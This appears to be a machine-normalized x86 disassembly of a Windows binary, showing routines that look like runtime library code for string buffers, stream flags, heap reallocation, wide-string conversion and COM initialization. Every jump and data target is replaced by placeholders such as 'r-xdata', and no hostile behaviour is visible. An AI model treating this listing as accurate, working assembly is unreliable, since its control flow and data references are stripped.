je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push eax
mov al [ esi ]
lea edx [ ebp + 0x8 ]
call sub_1007def5
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_1004cf0c
push 0x30
mov eax sub_1007ffde
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1002566a
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
push 0x10
pop edi
cmp [ ebp - 0x20 ] 0x10
mov ebx [ ebp - 0x34 ]
jae r-xdata
add edi edi
jmp r-xdata
dec esi
jne r-xdata
lea ebx [ ebp - 0x34 ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x34 ]
call sub_1003f510
cmp [ ebp - 0x20 ] 0x10
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
inc ebx
movzx eax [ ebx ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002c59e
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10041a20
mov eax esi
call sub_1004fa89
retn 0x20
sub_1004cfd7
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10024583
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10003fff
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_1002ec01
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_10031928
pop ecx
test eax eax
jne r-xdata
call sub_10003fff
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1002ec01
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000ab75
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_100338d2
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1004d14b
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1004d170
push ebp
mov ebp esp
push 0xffffffff
push sub_100809b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_10008757
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_1000bd19
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1000ad10
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_1006591f
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_100796a0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_1004d2b6
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_1000bd19
int3
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_1004d2f0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ esi ] al
mov eax [ ebp + 0x10 ]
push eax
push edx
push ecx
mov ecx esi
call sub_100417c0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1004d322
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1004ac7a
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10022b5a
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1003c644
pop ecx
call sub_1004fd6f
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1004fd6f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100027ad
pop ecx
mov [ esi ] eax
push esi
call sub_1003c644
pop ecx
test eax eax
je r-xdata
call sub_1004fd6f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100027ad
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_1004d3d0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
push esi
call sub_1004b8a0
lea ecx [ edi + 0x20 ]
push ecx
push esi
call sub_1004b8a0
push edi
push esi
call sub_10035fe0
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_1004d430
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx ]
push eax
mov eax [ edx ]
push eax
push ecx
call sub_100206e1
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_1004d460
push ebp
mov ebp esp
push 0xffffffff
push sub_10080504
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_100014b7
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_1003ed9a
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_10008757
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_1000bd19
sub_1004d510
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ esp + 0xc ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_1004d631
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1004d670
push ebp
mov ebp esp
push 0xffffffff
push sub_10081aa1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
sub esi 0xffffff80
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
sub edi 0xffffff80
jmp r-xdata
push esi
call sub_1003d790
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_1004d6cc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10054dd0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_1004d706
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_100371bb
add esi 0x2
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1004d73d
push 0x4
mov eax sub_1007f6d3
call sub_100097c8
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1001543e
mov eax esi
call sub_1004db01
retn 0x8
sub_1004d770
call sub_10062110
test eax eax
jne r-xdata
mov eax 0x1
retn
call sub_1003b400
test eax eax
jne r-xdata
call sub_10010a10
test eax eax
jne r-xdata
call sub_10006760
test eax eax
jne r-xdata
call sub_100586b0
test eax eax
jne r-xdata
call sub_1001bc90
test eax eax
jne r-xdata
call sub_100476f0
test eax eax
je r-xdata
call sub_1001fde0
test eax eax
jne r-xdata
call sub_1002f300
test eax eax
jne r-xdata
push eax
push eax
push sub_1002c330
push sub_10039a90
push eax
push eax
call sub_1002f01f
add esp 0x18
push eax
call [ CloseHandle@IAT ]
xor eax eax
retn
sub_1004d80c
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_10055606
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_1004d840
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
lea edi [ eax + 0x1 ]
mov [ ebp - 0x20 ] edi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_1004ac7a
add esp 0x4
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_1007d0c0
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
push eax
call sub_10008030
and eax 0xffff
or eax 0x80070000
test ebx ebx
jne r-xdata
push esi
push ebx
push edi
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_10008030
push ebx
call [ SysAllocString@IAT ]
mov edi eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test edi edi
jne r-xdata
push ebx
call sub_10022b5a
add esp 0x4
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push ebx
call sub_10022b5a
add esp 0x4
mov eax edi
push 0x8007000e
call sub_10008030
push eax
call sub_10008030
and eax 0xffff
or eax 0x80070000
sub_1004d9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008108c
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ebx 0x7
xor edi edi
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
xor ecx ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] cx
xor edx edx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] dx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] ax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] cx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] dx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc0 ] edi
mov [ esi + 0xb0 ] ax
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xdc ] edi
mov [ esi + 0xcc ] cx
lea ecx [ esi + 0xe8 ]
mov [ ebp - 0x4 ] bl
push 0x1
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] dx
call sub_100531b0
lea ecx [ esi + 0x104 ]
mov [ ebp - 0x4 ] 0x8
push 0x1
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] ax
call sub_100531b0
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
push edi
mov [ esi + 0x13c ] edi
push edi
mov [ esi + 0x140 ] edi
call [ CoInitializeEx@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1004db15
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_1004db33
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_10007cfe
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push eax
call sub_1005dec3
add esp 0x18
test eax eax
jne r-xdata
mov edx esi
cmp esi edi
jl r-xdata
test eax eax
jne r-xdata
sub eax 0x2
call sub_1004fd6f
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ebx
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add eax 0x2
add ecx 0x2
dec edx
cmp esi edi
je r-xdata
pop ebx
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1004dbdc
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10030ef2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1004dca7
push 0x34
mov eax sub_1007f454
call sub_1001bb6b
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ edi ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
xor edx edx
mov [ ebp - 0x40 ] eax
cmp cx si
je r-xdata
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov eax ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x3c ]
call sub_1004fa89
retn
movzx eax [ edi + ebx * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ edi + edx * 2 ]
cmp ax si
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx ecx [ edi ]
cmp ax cx
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc ebx
movzx eax [ edi + ebx * 2 ]
test ax ax
jne r-xdata
add ebx [ ebp - 0x34 ]
movzx eax [ edi + ebx * 2 ]
cmp ax [ edi ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp ax cx
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test ax ax
je r-xdata
movsx eax [ eax + esi ]
add ebx eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100081b8
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov ax [ edi + ebx * 2 ]
cmp ax [ ecx + 0x6 ]
jne r-xdata
call sub_10023e65
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100081b8
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005576a
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor ebx ebx
xor esi esi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
sub_1004de1d
push 0x8
mov eax sub_1007f5d3
call sub_1002152b
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1000a66f
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_100680bc
mov edi eax
xor eax eax
push ebx
